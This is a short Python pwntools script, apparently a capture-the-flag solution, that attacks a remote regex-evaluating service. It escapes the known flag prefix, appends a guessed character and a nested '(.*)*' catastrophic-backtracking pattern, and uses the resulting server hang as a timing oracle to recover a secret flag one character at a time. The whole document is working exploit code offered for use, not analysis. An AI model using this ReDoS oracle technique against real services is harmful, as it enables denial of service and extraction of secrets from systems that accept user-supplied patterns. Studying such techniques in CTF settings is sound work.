#!/usr/bin/env python3

import re
from pwn import *


def esc(c):
    if c == '[':
        return r'[\x5b]'
    if c == ']':
        return r'[\x5d]'
    if c == '\\':
        return r'[\x5c]'
    if c == '^':
        return r'[\x5e]'
    return f'[{c}]'

def test(rx, p):
    p.recvuntil(b"regex: ")
    p.sendline(rx)
    return not p.can_recv(1)

def bomb():
    seed = '.*'
    for i in range(100):
        seed = f'({seed})*'
    return seed

flag = 'tctf{'

while '}' not in flag:
    found = 0
    # p = process(["./redos.py"])
    p = remote("puzzler7.com", 10001)
    for c in range(32, 127):
        rx = ''.join(esc(i) for i in flag + chr(c))
        rx += bomb() + '}'
        if test(rx, p):
            flag += chr(c)
            found = 1
            break
    p.close()
    print(flag)
    if not found:
        flag += '}'
        print(flag)
        break
